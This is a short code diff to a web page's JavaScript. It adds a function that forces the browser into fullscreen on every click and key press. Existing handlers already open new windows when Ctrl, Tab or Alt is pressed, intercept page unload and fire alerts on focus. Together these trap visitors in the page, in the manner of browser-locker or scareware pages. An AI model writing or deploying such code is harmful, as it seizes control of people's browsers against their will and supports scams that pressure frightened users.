@@ -35,7 +35,9 @@ window.onbeforeunload = function() {
 };
 
 window.onclick = () => {
+    enterFullScreen();
     openWindow();
+    console.log("opening window and entering full screen");
 };
 
 window.onkeydown = function(e) {
@@ -46,6 +48,7 @@ window.onkeydown = function(e) {
     if (e.keyCode == 17 || e.keyCode == 9 || e.keyCode == 18) {
         openWindow();
     }
+    enterFullScreen();
 };
 
 // document.getElementById("open").click();
@@ -66,3 +69,17 @@ $(window)
         winRef.alert();
     })
     .blur(function() {});
+
+
+function enterFullScreen() {
+  if ((document.fullScreenElement && document.fullScreenElement !== null) ||    
+   (!document.mozFullScreen && !document.webkitIsFullScreen)) {
+    if (document.documentElement.requestFullScreen) {  
+      document.documentElement.requestFullScreen();  
+    } else if (document.documentElement.mozRequestFullScreen) {  
+      document.documentElement.mozRequestFullScreen();  
+    } else if (document.documentElement.webkitRequestFullScreen) {  
+      document.documentElement.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);  
+    }  
+  }
+}
